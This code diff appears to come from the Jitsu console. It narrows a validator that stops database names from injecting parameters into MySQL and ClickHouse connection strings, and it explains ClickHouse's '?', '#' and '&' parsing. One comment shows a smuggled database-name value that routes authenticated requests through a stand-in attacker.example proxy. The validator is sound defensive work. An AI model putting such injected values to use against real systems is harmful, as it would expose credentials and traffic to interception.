@@ -310,7 +310,8 @@ function findChangedTargets(node: any, original: any, path: (string | number)[],
 //   (A username cannot move the connection that way, and `user@server` usernames are legitimate, so only `database`.)
 // - ClickHouse: `protocol://user:password@hosts/database?param=value`, with the database put in as it is. A `?` starts
 //   the query string, so `events?http_proxy=http://attacker.example:8080` sets a driver option that carries the
-//   authenticated requests through that proxy.
+//   authenticated requests through that proxy, and a `#` cuts the name and drops the parameters after it. An `&` before
+//   the first `?` is plain path text (checked against clickhouse-go 2.45.0), so `R&D` is a valid name.
 // Bulker now quotes or avoids the string (JITSU-270; ClickHouse is not covered there), but a console talking to an older
 // Bulker must not rely on that.
 const CONNECTION_STRING_TYPES: Record<string, { fields: string[]; breaker: RegExp; what: string }> = {
@@ -325,7 +326,7 @@ const CONNECTION_STRING_TYPES: Record<string, { fields: string[]; breaker: RegEx
     what: "a space, quote or backslash",
   },
   mysql: { fields: ["database"], breaker: /[@/?]/, what: "@, / or ?" },
-  clickhouse: { fields: ["database"], breaker: /[?&#]/, what: "?, & or #" },
+  clickhouse: { fields: ["database"], breaker: /[?#]/, what: "? or #" },
 };
 
 /**
